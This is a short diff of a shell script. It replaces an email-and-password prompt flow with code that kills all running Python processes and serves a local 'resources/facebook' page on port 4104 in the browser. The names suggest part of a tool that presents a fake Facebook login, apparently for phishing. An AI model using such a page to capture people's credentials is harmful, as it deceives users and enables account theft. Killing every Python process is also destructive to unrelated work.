@@ -3,14 +3,7 @@
 #              VARIABLES              #
 #                                     #
 #######################################
-if [ $# -ne 2 ]
-	then
-		action="Please Enter Your Email Address:"
-	else
-		email="$2"
-		password=true
-		action="Please Enter Your Password:"
-fi
+action="Press Enter To Login"
 
 #######################################
 #                                     #
@@ -19,12 +12,14 @@ fi
 #######################################
 function page_action
 {
-	if [ -z "$email" ]
-		then
-			goto "login $1"
-		else
-			goto "pleaseWait $1""-$email"
-	fi
+	for X in `ps acx | grep -i python | awk {'print $1'}`; do
+		kill $X;
+	done
+	cd $scriptPath/resources/facebook/
+	rm -f pythonHTTPServer.log
+	nohup python -m SimpleHTTPServer 4104 >pythonHTTPServer.log 2>&1 &
+	open "http://localhost:4104"
+	goto "pleaseWait"
 }
 
 #######################################
@@ -32,9 +27,3 @@ function page_action
 #           PAGE CONTENT              #
 #                                     #
 #######################################
-if [ $# -ne 2 ]
-	then
-		heading "Login Below"
-	else
-		heading "Login Below" $2
-fi
